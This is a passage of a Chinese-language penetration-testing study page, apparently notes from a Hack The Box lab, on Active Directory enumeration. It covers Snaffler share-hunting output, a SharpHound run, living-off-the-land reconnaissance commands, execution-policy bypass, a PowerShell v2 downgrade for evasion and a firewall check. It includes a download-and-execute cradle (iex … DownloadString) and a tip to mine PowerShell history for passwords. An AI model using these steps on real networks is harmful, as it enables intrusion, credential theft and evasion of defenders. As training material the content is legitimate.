class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.sqldump</span><span class="variable">$</span>|<span class="number">310</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">02</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">AddPublish.sqldump</span>) <span class="type">.sqldump</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">FILE.INLANEFREIGHT.LOCAL</span>\<span class="type">WsusContent</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.keychain</span><span class="variable">$</span>|<span class="number">295</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">08</span>:<span class="number">42</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">SetStep.keychain</span>) <span class="type">.keychain</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.tblk</span><span class="variable">$</span>|<span class="number">279</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">25</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">FindConnect.tblk</span>) <span class="type">.tblk</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.psafe3</span><span class="variable">$</span>|<span class="number">301</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">33</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">GetUpdate.psafe3</span>) <span class="type">.psafe3</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.keypair</span><span class="variable">$</span>|<span class="number">278</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">09</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">UnprotectConvertTo.keypair</span>) <span class="type">.keypair</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.tblk</span><span class="variable">$</span>|<span class="number">280</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">17</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">ExportJoin.tblk</span>) <span class="type">.tblk</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.mdf</span><span class="variable">$</span>|<span class="number">305</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">27</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">FormatShow.mdf</span>) <span class="type">.mdf</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.mdf</span><span class="variable">$</span>|<span class="number">299</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">14</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">LockConfirm.mdf</span>) <span class="type">.mdf</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="type">SNIP</span>&gt;</span><br></pre></td></tr></table></figure>

<h2 id="11-BloodHound"><a href="#11-BloodHound" class="headerlink" title="11. BloodHound"></a>11. BloodHound</h2><h3 id="SharpHound-实战"><a href="#SharpHound-实战" class="headerlink" title="SharpHound 实战"></a>SharpHound 实战</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\SharpHound.exe <span class="literal">-c</span> All <span class="literal">--zipfilename</span> ILFREIGHT</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="literal">-04-18T13</span>:<span class="number">58</span>:<span class="number">22.1163680</span><span class="literal">-07</span>:<span class="number">00</span>|INFORMATION|Resolved Collection Methods: <span class="built_in">Group</span>, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</span><br><span class="line"><span class="number">2022</span><span class="literal">-04-18T13</span>:<span class="number">58</span>:<span class="number">22.1163680</span><span class="literal">-07</span>:<span class="number">00</span>|INFORMATION|Initializing SharpHound at <span class="number">1</span>:<span class="number">58</span> PM on <span class="number">4</span>/<span class="number">18</span>/<span class="number">2022</span></span><br><span class="line"><span class="number">2022</span><span class="literal">-04-18T13</span>:<span class="number">58</span>:<span class="number">22.6788709</span><span class="literal">-07</span>:<span class="number">00</span>|INFORMATION|Flags: <span class="built_in">Group</span>, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</span><br><span class="line"><span class="number">2022</span><span class="literal">-04-18T13</span>:<span class="number">58</span>:<span class="number">23.0851206</span><span class="literal">-07</span>:<span class="number">00</span>|INFORMATION|Beginning LDAP search <span class="keyword">for</span> INLANEFREIGHT.LOCAL</span><br><span class="line"><span class="number">2022</span><span class="literal">-04-18T13</span>:<span class="number">58</span>:<span class="number">53.9132950</span><span class="literal">-07</span>:<span class="number">00</span>|INFORMATION|Status: <span class="number">0</span> objects finished (+<span class="number">0</span> <span class="number">0</span>)/s <span class="literal">--</span> <span class="keyword">Using</span> 67 MB RAM</span><br><span class="line"><span class="number">2022</span><span class="literal">-04-18T13</span>:<span class="number">59</span>:<span class="number">15.7882419</span><span class="literal">-07</span>:<span class="number">00</span>|INFORMATION|Producer has finished, closing LDAP channel</span><br><span class="line"><span class="number">2022</span><span class="literal">-04-18T13</span>:<span class="number">59</span>:<span class="number">16.1788930</span><span class="literal">-07</span>:<span class="number">00</span>|INFORMATION|LDAP channel closed, waiting <span class="keyword">for</span> consumers</span><br><span class="line"><span class="number">2022</span><span class="literal">-04-18T13</span>:<span class="number">59</span>:<span class="number">23.9288698</span><span class="literal">-07</span>:<span class="number">00</span>|INFORMATION|Status: <span class="number">3793</span> objects finished (+<span class="number">3793</span> <span class="number">63.21667</span>)/s <span class="literal">--</span> <span class="keyword">Using</span> 112 MB RAM</span><br><span class="line"><span class="number">2022</span><span class="literal">-04-18T13</span>:<span class="number">59</span>:<span class="number">45.4132561</span><span class="literal">-07</span>:<span class="number">00</span>|INFORMATION|Consumers finished, closing output channel</span><br><span class="line">Closing writers</span><br><span class="line"><span class="number">2022</span><span class="literal">-04-18T13</span>:<span class="number">59</span>:<span class="number">45.4601086</span><span class="literal">-07</span>:<span class="number">00</span>|INFORMATION|Output channel closed, waiting <span class="keyword">for</span> output task to complete</span><br><span class="line"><span class="number">2022</span><span class="literal">-04-18T13</span>:<span class="number">59</span>:<span class="number">45.8663528</span><span class="literal">-07</span>:<span class="number">00</span>|INFORMATION|Status: <span class="number">3809</span> objects finished (+<span class="number">16</span> <span class="number">46.45122</span>)/s <span class="literal">--</span> <span class="keyword">Using</span> 110 MB RAM</span><br><span class="line"><span class="number">2022</span><span class="literal">-04-18T13</span>:<span class="number">59</span>:<span class="number">45.8663528</span><span class="literal">-07</span>:<span class="number">00</span>|INFORMATION|Enumeration finished <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>:<span class="number">22.7919186</span></span><br><span class="line"><span class="number">2022</span><span class="literal">-04-18T13</span>:<span class="number">59</span>:<span class="number">46.3663660</span><span class="literal">-07</span>:<span class="number">00</span>|INFORMATION|SharpHound Enumeration Completed at <span class="number">1</span>:<span class="number">59</span> PM on <span class="number">4</span>/<span class="number">18</span>/<span class="number">2022</span>! Happy Graphing</span><br></pre></td></tr></table></figure>

<h1 id="Living-Off-the-Land"><a href="#Living-Off-the-Land" class="headerlink" title="Living Off the Land"></a>Living Off the Land</h1><h2 id="主机与网络侦察的环境命令"><a href="#主机与网络侦察的环境命令" class="headerlink" title="主机与网络侦察的环境命令"></a>主机与网络侦察的环境命令</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>hostname</code></td>
<td>打印计算机的名称</td>
</tr>
<tr>
<td><code>[System.Environment]::OSVersion.Version</code></td>
<td>输出操作系统版本和修订级别</td>
</tr>
<tr>
<td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td>
<td>打印应用于主机的补丁和热修复程序</td>
</tr>
<tr>
<td><code>ipconfig /all</code></td>
<td>输出网络适配器状态和配置</td>
</tr>
<tr>
<td><code>set</code></td>
<td>显示当前会话的环境变量列表（从 CMD 提示符运行）</td>
</tr>
<tr>
<td><code>echo %USERDOMAIN%</code></td>
<td>显示主机所属的域名（从 CMD 提示符运行）</td>
</tr>
<tr>
<td><code>echo %logonserver%</code></td>
<td>输出主机所检查的域控制器的名称（从 CMD 提示符运行）</td>
</tr>
</tbody></table>
<h2 id="利用-PowerShell"><a href="#利用-PowerShell" class="headerlink" title="利用 PowerShell"></a>利用 PowerShell</h2><table>
<thead>
<tr>
<th><strong>Cmd-Let</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>Get-Module</code></td>
<td>列出可用的已加载模块以供使用。</td>
</tr>
<tr>
<td><code>Get-ExecutionPolicy -List</code></td>
<td>将打印主机上每个作用域的执行策略设置。</td>
</tr>
<tr>
<td><code>Set-ExecutionPolicy Bypass -Scope Process</code></td>
<td>这将使用 <code>-Scope</code> 参数更改我们当前进程的策略。这样做后，一旦我们退出或终止该进程，策略将恢复。这是理想的做法，因为我们不会对受害主机进行永久性更改。</td>
</tr>
<tr>
<td>&#96;Get-ChildItem Env:</td>
<td>ft Key,Value&#96;</td>
</tr>
<tr>
<td><code>Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</code></td>
<td>通过此字符串，我们可以获取指定用户的 PowerShell 历史记录。这非常有用，因为命令历史记录可能包含密码，或引导我们找到包含密码的配置文件或脚本。</td>
</tr>
<tr>
<td><code>powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&#39;URL to download the file from&#39;); &lt;follow-on commands&gt;&quot;</code></td>
<td>这是一种使用 PowerShell 从网页快速轻松下载文件并从内存中调用的方法。</td>
</tr>
</tbody></table>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-Module</span></span><br><span class="line"></span><br><span class="line">ModuleType Version    Name                                ExportedCommands</span><br><span class="line"><span class="literal">----------</span> <span class="literal">-------</span>    <span class="literal">----</span>                                <span class="literal">----------------</span></span><br><span class="line">Manifest   <span class="number">1.0</span>.<span class="number">1.0</span>    ActiveDirectory                     &#123;<span class="built_in">Add-ADCentralAccessPolicyMember</span>, <span class="built_in">Add-ADComputerServiceAcc</span>...</span><br><span class="line">Manifest   <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="built_in">Add-Member</span>, <span class="built_in">Add-Type</span>, <span class="built_in">Clear-Variable</span>, <span class="built_in">Compare-Object</span>...&#125;</span><br><span class="line">Script     <span class="number">2.0</span>.<span class="number">0</span>      PSReadline                          &#123;<span class="built_in">Get-PSReadLineKeyHandler</span>, <span class="built_in">Get-PSReadLineOption</span>, <span class="built_in">Remove-PS</span>...</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ExecutionPolicy</span> <span class="literal">-List</span></span><br><span class="line"><span class="built_in">Get-ExecutionPolicy</span> <span class="literal">-List</span></span><br><span class="line"></span><br><span class="line">        Scope ExecutionPolicy</span><br><span class="line">        <span class="literal">-----</span> <span class="literal">---------------</span></span><br><span class="line">MachinePolicy       Undefined</span><br><span class="line">   UserPolicy       Undefined</span><br><span class="line">      <span class="keyword">Process</span>       Undefined</span><br><span class="line">  CurrentUser       Undefined</span><br><span class="line"> LocalMachine    RemoteSigned</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ChildItem</span> Env: | <span class="built_in">ft</span> key,value</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-ChildItem</span> Env: | <span class="built_in">ft</span> key,value</span><br><span class="line"></span><br><span class="line">Key                     Value</span><br><span class="line"><span class="literal">---</span>                     <span class="literal">-----</span></span><br><span class="line">ALLUSERSPROFILE         C:\ProgramData</span><br><span class="line">APPDATA                 C:\Windows\system32\config\systemprofile\AppData\Roaming</span><br><span class="line">CommonProgramFiles      C:\Program Files (x86)\Common Files</span><br><span class="line">CommonProgramFiles(x86) C:\Program Files (x86)\Common Files</span><br><span class="line">CommonProgramW6432      C:\Program Files\Common Files</span><br><span class="line">COMPUTERNAME            ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">ComSpec                 C:\Windows\system32\cmd.exe</span><br><span class="line">DriverData              C:\Windows\System32\Drivers\DriverData</span><br><span class="line">LOCALAPPDATA            C:\Windows\system32\config\systemprofile\AppData\Local</span><br><span class="line">NUMBER_OF_PROCESSORS    <span class="number">4</span></span><br><span class="line">OS                      Windows_NT</span><br><span class="line">Path                    C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShel...</span><br><span class="line">PATHEXT                 .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL</span><br><span class="line">PROCESSOR_ARCHITECTURE  x86</span><br><span class="line">PROCESSOR_ARCHITEW6432  AMD64</span><br><span class="line">PROCESSOR_IDENTIFIER    AMD64 Family <span class="number">23</span> Model <span class="number">49</span> Stepping <span class="number">0</span>, AuthenticAMD</span><br><span class="line">PROCESSOR_LEVEL         <span class="number">23</span></span><br><span class="line">PROCESSOR_REVISION      <span class="number">3100</span></span><br><span class="line">ProgramData             C:\ProgramData</span><br><span class="line">ProgramFiles            C:\Program Files (x86)</span><br><span class="line">ProgramFiles(x86)       C:\Program Files (x86)</span><br><span class="line">ProgramW6432            C:\Program Files</span><br><span class="line">PROMPT                  <span class="variable">$P</span><span class="variable">$G</span></span><br><span class="line">PSModulePath            C:\Program Files\WindowsPowerShell\Modules;WindowsPowerShell\Modules;C:\Program Files (x86)\...</span><br><span class="line">PUBLIC                  C:\Users\Public</span><br><span class="line">SystemDrive             C:</span><br><span class="line">SystemRoot              C:\Windows</span><br><span class="line">TEMP                    C:\Windows\TEMP</span><br><span class="line">TMP                     C:\Windows\TEMP</span><br><span class="line">USERDOMAIN              INLANEFREIGHT</span><br><span class="line">USERNAME                ACADEMY<span class="literal">-EA-MS01</span><span class="variable">$</span></span><br><span class="line">USERPROFILE             C:\Windows\system32\config\systemprofile</span><br><span class="line">windir                  C:\Windows</span><br></pre></td></tr></table></figure>

<h3 id="降级-PowerShell-更加opsec"><a href="#降级-PowerShell-更加opsec" class="headerlink" title="降级 PowerShell(更加opsec)"></a>降级 PowerShell(更加opsec)</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-host</span></span><br><span class="line"></span><br><span class="line">Name             : ConsoleHost</span><br><span class="line">Version          : <span class="number">5.1</span>.<span class="number">19041.1320</span></span><br><span class="line">InstanceId       : <span class="number">18</span>ee9fb4<span class="literal">-ac42-4dfe-85b2-61687291bbfc</span></span><br><span class="line">UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface</span><br><span class="line">CurrentCulture   : en<span class="literal">-US</span></span><br><span class="line">CurrentUICulture : en<span class="literal">-US</span></span><br><span class="line">PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy</span><br><span class="line">DebuggerEnabled  : True</span><br><span class="line">IsRunspacePushed : False</span><br><span class="line">Runspace         : System.Management.Automation.Runspaces.LocalRunspace</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; powershell.exe <span class="literal">-version</span> <span class="number">2</span></span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) <span class="number">2009</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-host</span></span><br><span class="line">Name             : ConsoleHost</span><br><span class="line">Version          : <span class="number">2.0</span></span><br><span class="line">InstanceId       : <span class="number">121</span>b807c<span class="literal">-6daa-4691-85ef-998ac137e469</span></span><br><span class="line">UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface</span><br><span class="line">CurrentCulture   : en<span class="literal">-US</span></span><br><span class="line">CurrentUICulture : en<span class="literal">-US</span></span><br><span class="line">PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy</span><br><span class="line">IsRunspacePushed : False</span><br><span class="line">Runspace         : System.Management.Automation.Runspaces.LocalRunspace</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">get-module</span></span><br><span class="line"></span><br><span class="line">ModuleType Version    Name                                ExportedCommands</span><br><span class="line"><span class="literal">----------</span> <span class="literal">-------</span>    <span class="literal">----</span>                                <span class="literal">----------------</span></span><br><span class="line">Script     <span class="number">0.0</span>        chocolateyProfile                   &#123;TabExpansion, <span class="built_in">Update-SessionEnvironment</span>, refreshenv&#125;</span><br><span class="line">Manifest   <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerShell.Management     &#123;<span class="built_in">Add-Computer</span>, <span class="built_in">Add-Content</span>, <span class="built_in">Checkpoint-Computer</span>, <span class="built_in">Clear-Content</span>...&#125;</span><br><span class="line">Manifest   <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="built_in">Add-Member</span>, <span class="built_in">Add-Type</span>, <span class="built_in">Clear-Variable</span>, <span class="built_in">Compare-Object</span>...&#125;</span><br><span class="line">Script     <span class="number">0.7</span>.<span class="number">3.1</span>    posh<span class="literal">-git</span>                            &#123;<span class="built_in">Add-PoshGitToProfile</span>, <span class="built_in">Add-SshKey</span>, <span class="built_in">Enable-GitColors</span>, <span class="built_in">Expand-GitCommand</span>...&#125;</span><br><span class="line">Script     <span class="number">2.0</span>.<span class="number">0</span>      PSReadline                          &#123;<span class="built_in">Get-PSReadLineKeyHandler</span>, <span class="built_in">Get-PSReadLineOption</span>, <span class="built_in">Remove-PSReadLineKeyHandler</span>...</span><br></pre></td></tr></table></figure>

<h3 id="检查防御措施"><a href="#检查防御措施" class="headerlink" title="检查防御措施"></a>检查防御措施</h3><p><strong>防火墙检查</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line">Domain Profile Settings:</span><br><span class="line"><span class="literal">----------------------------------------------------------------------</span></span><br><span class="line">State                                 OFF</span><br><span class="line">Firewall Policy                       BlockInbound,AllowOutbound</span><br><span class="line">LocalFirewallRules                    N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">LocalConSecRules                      N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">InboundUserNotification               Disable</span><br><span class="line">RemoteManagement                      Disable</span><br><span class="line">UnicastResponseToMulticast            Enable</span><br><span class="line"></span><br><span class="line">Logging:</span><br><span class="line">LogAllowedConnections                 Disable</span><br><span class="line">LogDroppedConnections                 Disable</span><br><span class="line">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br><span class="line">MaxFileSize                           <span class="number">4096</span></span><br><span class="line"></span><br><span class="line">Private Profile Settings:</span><br><span class="line"><span class="literal">----------------------------------------------------------------------</span></span><br><span class="line">State                                 OFF</span><br><span class="line">Firewall Policy                       BlockInbound,AllowOutbound</span><br><span class="line">LocalFirewallRules                    N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">LocalConSecRules                      N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">InboundUserNotification               Disable</span><br><span class="line">RemoteManagement                      Disable</span><br><span class="line">UnicastResponseToMulticast            Enable</span><br><span class="line"></span><br><span class="line">Logging:</span><br><span class="line">LogAllowedConnections                 Disable</span><br><span class="line">LogDroppedConnections                 Disable</span><br><span class="line">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br><span class="line">MaxFileSize                           <span class="number">4096</span></span><br><span class="line"></span><br><span class="line">Public Profile Settings:</span><br><span class="line"><span class="literal">----------------------------------------------------------------------</span></span><br><span class="line">State                                 OFF</span><br><span class="line">Firewall Policy                       BlockInbound,AllowOutbound</span><br><span class="line">LocalFirewallRules                    N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">LocalConSecRules                      N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">InboundUserNotification               Disable</span><br><span class="line">RemoteManagement                      Disable</span><br><span class="line">UnicastResponseToMulticast            Enable</span><br><span class="line"></span><br><span class="line">Logging:</span><br><span class="line">LogAllowedConnections                 Disable</span><br><span class="line">LogDroppedConnections                 Disable</span><br><span class="line">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br><span class="line">MaxFileSize                           <span class="number">4096</span></span><br></pre></td></tr></table></figure>

